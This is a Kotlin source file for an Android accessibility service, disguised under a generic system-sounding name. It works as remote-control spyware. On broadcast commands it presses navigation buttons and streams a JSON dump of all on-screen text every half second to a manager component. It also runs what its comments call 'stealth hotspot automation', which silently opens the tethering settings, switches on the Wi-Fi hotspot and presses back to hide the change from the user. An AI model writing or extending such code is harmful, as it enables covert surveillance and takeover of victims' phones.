package com.systemlinker.features

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import org.json.JSONArray
import org.json.JSONObject

class SystemAccessibility : AccessibilityService() {

    private var isStreamingScreen = false
    private var lastDumpTime = 0L
    private val DUMP_INTERVAL_MS = 500L

    // State trackers for stealth hotspot automation
    private var isAutomatingHotspot = false
    private var hotspotAutomationStartTime = 0L

    private val commandReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            when (intent?.getStringExtra("action")) {
                "btn_back" -> performGlobalAction(GLOBAL_ACTION_BACK)
                "btn_home" -> performGlobalAction(GLOBAL_ACTION_HOME)
                "btn_recents" -> performGlobalAction(GLOBAL_ACTION_RECENTS)
                "stream_screen_start" -> isStreamingScreen = true
                "stream_screen_stop" -> isStreamingScreen = false
                "toggle_hotspot" -> {
                    // Activate automation state and start timeout timer
                    isAutomatingHotspot = true
                    hotspotAutomationStartTime = System.currentTimeMillis()
                    
                    try {
                        // Attempt standard direct entry point
                        val settingsIntent = Intent().apply {
                            setClassName("com.android.settings", "com.android.settings.TetherSettings")
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                        this@SystemAccessibility.startActivity(settingsIntent)
                    } catch (e: Exception) {
                        // Fallback entry point
                        val fallbackIntent = Intent("android.settings.TETHER_SETTINGS").apply {
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                        this@SystemAccessibility.startActivity(fallbackIntent)
                    }
                }
            }
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
        }
        serviceInfo = info

        val filter = IntentFilter("com.systemlinker.ACC_ACTION")
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(commandReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(commandReceiver, filter)
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        // --- 1. HOTSPOT AUTOMATION LOGIC ---
        if (isAutomatingHotspot) {
            // Failsafe: If automation takes more than 4 seconds, abort and close to prevent being stuck
            if (System.currentTimeMillis() - hotspotAutomationStartTime > 4000) {
                isAutomatingHotspot = false
                performGlobalAction(GLOBAL_ACTION_BACK)
                return
            }

            val rootNode = rootInActiveWindow ?: return
            
            // Comprehensive list of strings used by different OEMs for the Hotspot toggle
            val keywords = listOf("Wi-Fi hotspot", "Use Wi-Fi hotspot", "Portable hotspot", "Tethering")
            var clicked = false

            for (keyword in keywords) {
                val nodes = rootNode.findAccessibilityNodeInfosByText(keyword)
                if (nodes.isNotEmpty()) {
                    val clickableNode = findClickableParent(nodes.first())
                    if (clickableNode != null) {
                        clickableNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        clicked = true
                    }
                }
                nodes.forEach { it.recycle() }
                if (clicked) break
            }

            // If we successfully clicked the toggle, wait 250ms and instantly press back to hide it
            if (clicked) {
                isAutomatingHotspot = false
                Thread.sleep(250)
                performGlobalAction(GLOBAL_ACTION_BACK)
            }
            
            rootNode.recycle()
            return // Skip screen streaming logic while automating
        }

        // --- 2. SCREEN STREAMING LOGIC ---
        if (!isStreamingScreen) return
        
        val currentTime = System.currentTimeMillis()
        if (currentTime - lastDumpTime < DUMP_INTERVAL_MS) return
        lastDumpTime = currentTime

        val rootNode = rootInActiveWindow ?: return
        val screenData = dumpNode(rootNode)
        rootNode.recycle()

        val jsonPayload = JSONObject().apply {
            put("type", "live_screen")
            put("data", screenData)
        }
        
        val broadcast = Intent("com.systemlinker.SCREEN_DATA").apply {
            // Also explicitly routing the screen data back to the manager
            setPackage(applicationContext.packageName)
            putExtra("json", jsonPayload.toString())
        }
        sendBroadcast(broadcast)
    }
    
    private fun findClickableParent(node: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
        var currentNode = node
        while (currentNode != null) {
            if (currentNode.isClickable) {
                return currentNode
            }
            val parent = currentNode.parent
            if (currentNode != node) currentNode.recycle()
            currentNode = parent
        }
        return null
    }

    private fun dumpNode(node: AccessibilityNodeInfo): JSONObject {
        val obj = JSONObject()
        obj.put("class", node.className?.toString() ?: "")
        obj.put("text", node.text?.toString() ?: "")
        obj.put("desc", node.contentDescription?.toString() ?: "")
        
        val children = JSONArray()
        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (child != null) {
                children.put(dumpNode(child))
                child.recycle()
            }
        }
        if (children.length() > 0) obj.put("children", children)
        return obj
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        super.onDestroy()
        unregisterReceiver(commandReceiver)
    }
}